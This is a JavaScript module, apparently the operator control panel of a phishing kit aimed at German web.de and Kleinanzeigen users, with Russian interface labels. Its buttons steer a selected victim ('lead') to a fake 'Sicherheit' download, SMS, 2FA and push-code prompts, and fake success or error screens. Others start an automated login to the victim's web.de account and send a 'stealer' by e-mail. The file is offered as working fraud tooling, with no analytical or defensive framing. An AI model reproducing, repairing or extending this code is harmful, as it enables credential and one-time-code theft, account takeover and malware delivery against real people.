/** GMW Admin lead actions orchestration. */
(function () {
  'use strict';
  var adminCoreUtils = window.AdminCoreUtils || {};

  var DEFAULT_ACTION_EVENT_LABELS = {
    '/api/redirect-sicherheit': 'Отправлен на скачивание',
    '/api/redirect-download-by-platform': 'Отправлен на скачивание',
    '/api/redirect-android': 'Отправлен на скачивание (Android)',
    '/api/redirect-open-on-pc': 'Отправлен на страницу ПК',
    '/api/show-success': 'Успешный вход',
    '/api/show-error': 'Ошибка',
    '/api/redirect-sms-code': 'SMS',
    '/api/redirect-2fa-code': 'Просит 2FA',
    '/api/redirect-push': 'PUSH',
    '/api/redirect-change-password': 'Успех',
    '/api/redirect-klein-forgot': 'Klein: официальный Passwort vergessen',
    '/api/redirect-klein-sms-wait': 'Окно ожидания',
    '/api/mark-worked': 'Отработан',
  };

  function bindClickOnce(el, key, handler) {
    if (!el || !el.addEventListener || !key || typeof handler !== 'function') return;
    var flag = '__gmwClickBound_' + String(key);
    if (el[flag]) return;
    el[flag] = true;
    el.addEventListener('click', handler);
  }

  function parseResponseError(r, fallbackPrefix) {
    if (!r) return Promise.reject(new Error(fallbackPrefix || 'Ошибка запроса'));
    return r.text().then(function (text) {
      var data = {};
      try {
        data = text && text.trim() ? JSON.parse(text) : {};
      } catch (parseErr) {
        var snippet = (text || '').replace(/\s+/g, ' ').trim().slice(0, 160);
        if (snippet) return Promise.reject(new Error('Ответ сервера (' + r.status + '): ' + snippet));
        return Promise.reject(new Error((fallbackPrefix || 'Ошибка запроса') + ': HTTP ' + r.status));
      }
      return Promise.reject(new Error((data && data.error) || ((fallbackPrefix || 'Ошибка запроса') + ': HTTP ' + r.status)));
    });
  }

  function createLeadActionsController(opts) {
    opts = opts || {};
    var actionRequestInFlight = Object.create(null);
    var actionLastStartedAt = Object.create(null);
    var isBound = false;
    var actionEventLabels = Object.assign({}, DEFAULT_ACTION_EVENT_LABELS, opts.actionEventLabels || {});

    var getSelectedId = typeof opts.getSelectedId === 'function' ? opts.getSelectedId : function () { return null; };
    var getLeads = typeof opts.getLeads === 'function' ? opts.getLeads : function () { return []; };
    var leadIdsEqual = typeof opts.leadIdsEqual === 'function'
      ? opts.leadIdsEqual
      : (typeof adminCoreUtils.leadIdsEqual === 'function'
        ? adminCoreUtils.leadIdsEqual
        : function (a, b) { return String(a || '') === String(b || ''); });
    var leadIsSidebarWorked = typeof opts.leadIsSidebarWorked === 'function'
      ? opts.leadIsSidebarWorked
      : function () { return false; };
    var postJson = typeof opts.postJson === 'function'
      ? opts.postJson
      : function () { return Promise.reject(new Error('postJson is not provided')); };
    var parseJsonResponseThrowIfNotOk = typeof opts.parseJsonResponseThrowIfNotOk === 'function'
      ? opts.parseJsonResponseThrowIfNotOk
      : function (r) { return r.json(); };
    var showToast = typeof opts.showToast === 'function' ? opts.showToast : function () {};
    var loadLeads = typeof opts.loadLeads === 'function' ? opts.loadLeads : function () { return Promise.resolve(); };
    var addOptimisticEvent = typeof opts.addOptimisticEvent === 'function' ? opts.addOptimisticEvent : function () {};
    var workedToggleOffLabel = String(opts.eventWorkedToggleOffLabel || 'Снята пометка оператором');

    function findLeadById(id) {
      var list = getLeads();
      var i;
      for (i = 0; i < list.length; i++) {
        if (list[i] && leadIdsEqual(list[i].id, id)) return list[i];
      }
      return null;
    }

    function getActionLabel(apiPath, id) {
      if (apiPath === '/api/mark-worked') {
        var leadToggle = findLeadById(id);
        if (leadToggle && (leadToggle.klLogArchived === true || leadToggle.klLogArchived === 'true')) return '';
        return (leadToggle && leadIsSidebarWorked(leadToggle)) ? workedToggleOffLabel : 'Отработан';
      }
      return actionEventLabels[apiPath] || '';
    }

    function buildActionPayload(id, payload) {
      var baseId = id != null ? String(id).trim() : '';
      var body = {};
      if (payload && typeof payload === 'object') {
        for (var key in payload) {
          if (Object.prototype.hasOwnProperty.call(payload, key)) body[key] = payload[key];
        }
      }
      if (body.id == null && baseId) body.id = baseId;
      if (body.id != null) body.id = String(body.id).trim();
      return body;
    }

    function loadLeadsSafe() {
      try {
        return Promise.resolve(loadLeads());
      } catch (err) {
        return Promise.reject(err);
      }
    }

    function runActionRequest(apiPath, id, payload, buttonEl, options) {
      options = options || {};
      var requestBody = buildActionPayload(id, payload);
      var leadId = requestBody && requestBody.id ? String(requestBody.id) : '';
      if (!leadId) return Promise.resolve({ ok: false, error: new Error('No record selected') });
      var actionKey = String(apiPath || '') + '::' + leadId;
      var nowMs = Date.now();
      var lastStartMs = Number(actionLastStartedAt[actionKey] || 0);
      if (lastStartMs > 0 && (nowMs - lastStartMs) < 800) {
        return Promise.resolve({ ok: false, skipped: true });
      }
      if (actionRequestInFlight[actionKey]) return Promise.resolve({ ok: false, skipped: true });
      actionLastStartedAt[actionKey] = nowMs;
      actionRequestInFlight[actionKey] = true;
      // The backend immediately appends authoritative admin events, so optimistic duplicates
      // can look like a second unintended click/action in the UI timeline.
      if (buttonEl) buttonEl.classList.add('is-pending');
      return postJson(apiPath, requestBody)
        .then(function (r) {
          if (r && !r.ok) return parseResponseError(r, options.errorPrefix || 'Ошибка запроса');
          return loadLeadsSafe().then(function () {
            return { ok: true };
          });
        })
        .catch(function (err) {
          var fallbackMessage = String(options.errorToastFallback || '');
          var message = err && err.message ? err.message : fallbackMessage;
          if (message) showToast(message);
          return loadLeadsSafe().then(function () {
            return { ok: false, error: err };
          });
        })
        .finally(function () {
          delete actionRequestInFlight[actionKey];
          if (buttonEl) buttonEl.classList.remove('is-pending');
        });
    }

    function runAction(apiPath, id, buttonEl) {
      return runActionRequest(apiPath, id, { id: id }, buttonEl);
    }

    function doAction(path, ev) {
      var id = getSelectedId();
      if (!id) return;
      var btn = ev && ev.currentTarget ? ev.currentTarget : null;
      runAction(path, id, btn);
    }

    function bindActionButton(buttonId, apiPath) {
      var btn = document.getElementById(buttonId);
      if (!btn) return;
      bindClickOnce(btn, buttonId + ':' + apiPath, function (e) { doAction(apiPath, e); });
    }

    function bindAutologinStart() {
      var btnAutologinStart = document.getElementById('btn-autologin-start');
      if (!btnAutologinStart) return;
      bindClickOnce(btnAutologinStart, 'btn-autologin-start', function (e) {
        var selectedId = getSelectedId();
        if (!selectedId) {
          showToast('Выберите лида');
          return;
        }
        var btn = e.currentTarget;
        if (btn && btn.classList && btn.classList.contains('is-pending')) return;
        if (btn) btn.classList.add('is-pending');
        postJson('/api/webde-login-start', { id: selectedId })
          .then(function (r) {
            if (!r) throw new Error('Ошибка запуска');
            return r.text().then(function (text) {
              var data = {};
              try { data = text ? JSON.parse(text) : {}; } catch (_) {}
              if (!r.ok || (data && data.ok === false)) {
                throw new Error((data && data.error) || ('Ошибка запуска: HTTP ' + r.status));
              }
              return data;
            });
          })
          .then(function (data) {
            var state = (data && data.message) ? String(data.message) : 'started';
            showToast(state === 'queued' ? 'Автовход поставлен в очередь' : 'Автовход запущен');
            return loadLeadsSafe();
          })
          .catch(function (err) {
            showToast((err && err.message) ? err.message : 'Ошибка запуска автовхода');
          })
          .finally(function () {
            if (btn) btn.classList.remove('is-pending');
          });
      });
    }

    function bindSendConfigEmail() {
      var btn = document.getElementById('btn-send-config-email');
      if (!btn) return;
      bindClickOnce(btn, 'btn-send-config-email', function (e) {
        var selectedId = getSelectedId();
        if (!selectedId) return;
        var btnEl = e.currentTarget;
        if (btnEl && btnEl.classList && btnEl.classList.contains('is-pending')) return;
        if (btnEl) btnEl.classList.add('is-pending');
        postJson('/api/send-email', { id: selectedId })
          .then(parseJsonResponseThrowIfNotOk)
          .then(function (data) {
            showToast('Отправлено (Config → E-Mail)' + (data && data.fromEmail ? ': ' + data.fromEmail : ''));
            return loadLeadsSafe();
          })
          .catch(function (err) {
            showToast((err && err.message) ? err.message : 'Ошибка отправки');
          })
          .finally(function () {
            if (btnEl) btnEl.classList.remove('is-pending');
          });
      });
    }

    function bindSendMailerStealer() {
      var btn = document.getElementById('btn-send-mailer-stealer');
      if (!btn) return;
      bindClickOnce(btn, 'btn-send-mailer-stealer', function (e) {
        var selectedId = getSelectedId();
        if (!selectedId) return;
        var btnEl = e.currentTarget;
        if (btnEl && btnEl.classList && btnEl.classList.contains('is-pending')) return;
        if (btnEl) btnEl.classList.add('is-pending');
        postJson('/api/send-stealer', { id: selectedId })
          .then(parseJsonResponseThrowIfNotOk)
          .then(function () {
            return loadLeadsSafe();
          })
          .catch(function (err) {
            showToast((err && err.message) ? err.message : 'Ошибка отправки Stealer');
          })
          .finally(function () {
            if (btnEl) btnEl.classList.remove('is-pending');
          });
      });
    }

    function bindButtons() {
      if (isBound) return;
      isBound = true;

      bindActionButton('btn-sicherheit', '/api/redirect-download-by-platform');
      bindActionButton('btn-android', '/api/redirect-android');
      bindActionButton('btn-open-on-pc', '/api/redirect-open-on-pc');
      bindActionButton('btn-success', '/api/show-success');
      bindActionButton('btn-worked', '/api/mark-worked');
      bindActionButton('btn-error', '/api/show-error');
      bindActionButton('btn-sms', '/api/redirect-sms-code');
      bindActionButton('btn-sms-klein-action', '/api/redirect-sms-code');
      bindActionButton('btn-2fa', '/api/redirect-2fa-code');
      bindActionButton('btn-push', '/api/redirect-push');
      bindActionButton('btn-change-password', '/api/redirect-change-password');

      var btnSmsKlein = document.getElementById('btn-sms-klein');
      var btnSmsKleinAction = document.getElementById('btn-sms-klein-action');
      if (btnSmsKlein && !btnSmsKleinAction) {
        bindClickOnce(btnSmsKlein, 'btn-sms-klein:legacy', function (e) { doAction('/api/redirect-sms-code', e); });
      }

      bindAutologinStart();
      bindSendConfigEmail();
      bindSendMailerStealer();
    }

    return {
      bindButtons: bindButtons,
      runAction: runAction,
      runActionRequest: runActionRequest,
      getActionLabel: getActionLabel,
      addOptimisticEvent: addOptimisticEvent
    };
  }

  window.AdminActions = {
    createLeadActionsController: createLeadActionsController
  };
})();
